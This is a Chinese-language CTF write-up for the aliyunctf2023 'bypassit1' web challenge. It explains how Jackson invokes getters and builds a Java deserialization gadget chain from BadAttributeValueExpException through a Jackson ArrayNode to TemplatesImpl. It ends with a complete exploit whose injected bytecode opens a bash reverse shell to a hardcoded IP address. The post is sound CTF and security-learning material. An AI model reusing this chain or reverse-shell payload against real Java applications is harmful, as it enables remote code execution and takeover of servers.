---
layout: post
title: aliyunctf2023-bypassit1
date: 2023-05-03 20:19 +0800
categories: [ctf, web]
tag: [web, java, jackson]
---

## 环境依赖
* jdk 8u332
* 看一下pom.xml
  * `spring-boot-starter-web`
  * `spring-boot-starter-test` 
  * 版本2.6.11

因此可以写出如下的pom.xml
```xml
<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
        <version>2.6.11</version>
    </dependency>

    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-test</artifactId>
        <version>2.6.11</version>
        <scope>test</scope>
    </dependency>
</dependencies>
```

内置了很多包，这里值得注意的依赖就是jackson了，jackson不了解，先来学习一下。

## jackson同样会触发getter及setter
* 使用如下例子 可以观察到
  * 序列化（对象->字符串）会调用getter
  * 反序列化（字符串->对象）会调用setter

```java
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;

public class User {
    private String name;
    private String age;

    public User() {
    }

    public User(String name, String age) {
        this.name = name;
        this.age = age;
    }

    public String getName() {
        System.out.println("getname");
        return name;
    }

    public void setName(String name) {
        System.out.println("setname");
        this.name = name;
    }

    public String getAge() {
        return age;
    }

    public void setAge(String age) {
        this.age = age;
    }
    public static void main(String[] args) throws JsonProcessingException {
        System.out.println("serialize");
        User u = new User("aaa","bbb");
        ObjectMapper obj = new ObjectMapper();
        String json = obj.writeValueAsString(u);
        System.out.println(json);


        System.out.println("unserialize");

        User tmp = obj.readValue(json, User.class);
        System.out.println(tmp);
    }
}
/*
serialize
getname
{"name":"aaa","age":"bbb"}

unserialize
setname
User@ff5b51f
*/
```
## 调试jackson触发getter的过程
调试一下，可以看到在下图调用了getter
![](/assets/img/2023-05-03-21-35-20.png)
![](/assets/img/2023-05-03-21-35-26.png)

stack关键部分如下
```
serializeAsField:692, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)
serializeFields:774, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)
serialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)
```

## 获得部分gadget
既然我们可以调用getter了，那么容易想到`TemplatesImpl`这条链，现在的gadget如下
```
TemplatesImpl.getOutputProperties()
use jackson to call object's getter (object -> str)
```
那么怎么触发object转成字符串这个过程呢, 回顾常用的入口类：
`BadAttributeValueExpException` 绝对不错！

## 获得整个gadget
```
③TemplatesImpl#getOutputProperties
②jacksonType#toString
①BadAttributeValueExpException触发val的toString方法
```
当然现在还只是感觉上没问题，我们先本地跑起来看看
* 首先在`com.fasterxml.jackson.databind.node`看到了一堆类型
* 去源码中[引用1](https://github.com/FasterXML/jackson-databind/tree/jackson-databind-2.13.1/src/main/java/com/fasterxml/jackson/databind/node) 我们可以找一下可接受Object的构造方法，找到了两条路子
  * `POJONode(Object v)`
  * `ArrayNode#addPOJO(Object pojo)`

写完，打！报了个错
```
Failed to JDK deserialize `JsonNode` value: xxx
```
跟一下报错，发现报错出在`writeReplace`方法上，调试一下往前看看这个是反射找的，没有的话就不会调用的，因此把他删了或者名字改了就行。（文件在`com.fasterxml.jackson.databind.node`下的`BaseJsonNode`）

此时可以patch jar包或者创建同名文件(后者更方便)


## 最终exp
```java
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.*;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

public class Test {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static byte[] getEvilByteCode() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.makeClass("aaa");
        String cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/121.5.230.115/7777 0>&1\"});";
        //静态方法
        cc.makeClassInitializer().insertBefore(cmd);

        //设置满足条件的父类
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
        //获取字节码
        byte[] code = cc.toBytecode();
        return code;
    }

    public static String getBase64Data(Object obj) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }

    public static Object readBase64Data(String base64Data) throws Exception {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(base64Data));
        ObjectInputStream ois = new ObjectInputStream(byteArrayInputStream);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }

    public static void main(String[] args) throws Exception {
        byte[] code = getEvilByteCode();
        TemplatesImpl tpl = new TemplatesImpl();
        setFieldValue(tpl, "_bytecodes", new byte[][]{code});
        setFieldValue(tpl, "_name", "233");
        setFieldValue(tpl, "_tfactory", new TransformerFactoryImpl());

        ObjectMapper mapper = new ObjectMapper();
        ArrayNode arr = mapper.createArrayNode();
        arr.addPOJO(tpl);
//        POJONode pj = new POJONode(tpl);

        BadAttributeValueExpException bad = new BadAttributeValueExpException("1");
        setFieldValue(bad, "val", arr);
        String output = getBase64Data(bad);
        System.out.println(output);
    }
}
```
最终看一下整条链
```
serializeAsField:692, BeanPropertyWriter (com.fasterxml.jackson.databind.ser) ④
serializeFields:774, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std) 
serialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)
defaultSerializeValue:1142, SerializerProvider (com.fasterxml.jackson.databind)
serialize:115, POJONode (com.fasterxml.jackson.databind.node)
serialize:180, ArrayNode (com.fasterxml.jackson.databind.node)
serialize:39, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)
serialize:20, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)
_serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)
serialize:1518, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)
_writeValueAndClose:1219, ObjectWriter (com.fasterxml.jackson.databind)
writeValueAsString:1086, ObjectWriter (com.fasterxml.jackson.databind) ③
nodeToString:30, InternalNodeMapper (com.fasterxml.jackson.databind.node)
toString:59, BaseJsonNode (com.fasterxml.jackson.databind.node) ②
readObject:86, BadAttributeValueExpException (javax.management) ①
```

## 总结
经典入口类`BadAttributeValueExpException`配合jackson调用`TemplatesImpl`的getter进行rce，有意思！


